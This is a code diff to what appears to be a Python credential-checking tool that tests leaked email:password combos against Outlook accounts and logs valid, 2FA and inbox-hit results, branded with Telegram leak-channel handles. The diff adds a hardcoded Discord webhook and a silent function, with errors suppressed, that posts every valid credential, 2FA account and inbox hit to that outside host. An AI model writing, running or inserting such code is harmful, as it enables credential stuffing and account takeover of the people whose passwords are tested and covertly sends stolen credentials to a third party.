@@ -17,6 +17,7 @@ init()
 TG_USER = "@Fatbusinessman"
 TG_CHAN = "https://t.me/ChkLeak"
 CREDIT_LINE = "| @evilmarkhors | https://t.me/+IGM63Xe1A-43ZTdk"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1572996349002256436/7pbNUq_RbjfVqmIfOkYSZyqS2N6j5Je1D_m-hmC-bLwHLpvXOn5WJ7AOh8cdyjIrIDUo"
 
 OUTLOOK_CLIENT_ID = "9199bf20-a13f-4107-85dc-02114787ef48"
 OUTLOOK_REDIRECT = "https://outlook.live.com/mail/"
@@ -90,6 +91,15 @@ def print_banner():
     ║           {CREDIT_LINE}          ║
     ╚═══════════════════════════════════════════════════╝
     {Style.RESET_ALL}""")
+
+
+def discord_webhook(message):
+    """Send message to Discord webhook"""
+    try:
+        webhook_data = {"content": message}
+        requests.post(DISCORD_WEBHOOK, json=webhook_data, timeout=5)
+    except Exception:
+        pass
 
 
 def animated_bar(percent, width=40):
@@ -297,6 +307,7 @@ def check_account(email, password):
                                         f"count={d['count']} | "
                                         f"sample={d['subjects'][0] if d['subjects'] else ''} | "
                                         f"{CREDIT_LINE}\n")
+                        discord_webhook(f"Inbox Hit: {email}:{password} | {' | '.join(found)}")
                         print(f"{Fore.MAGENTA}📬 Inbox Hit: {email}:{password} → "
                               f"{', '.join(found)}{Style.RESET_ALL}")
 
@@ -334,9 +345,11 @@ def worker(combo):
             if result == "VALID":
                 with open("valid.txt", "a", encoding="utf-8") as f:
                     f.write(f"{account} | {CREDIT_LINE}\n")
+                discord_webhook(f"VALID: {account}")
             elif result == "2FA":
                 with open("2fa.txt", "a", encoding="utf-8") as f:
                     f.write(f"{account} | {CREDIT_LINE}\n")
+                discord_webhook(f"2FA: {account}")
     except:
         pass
 
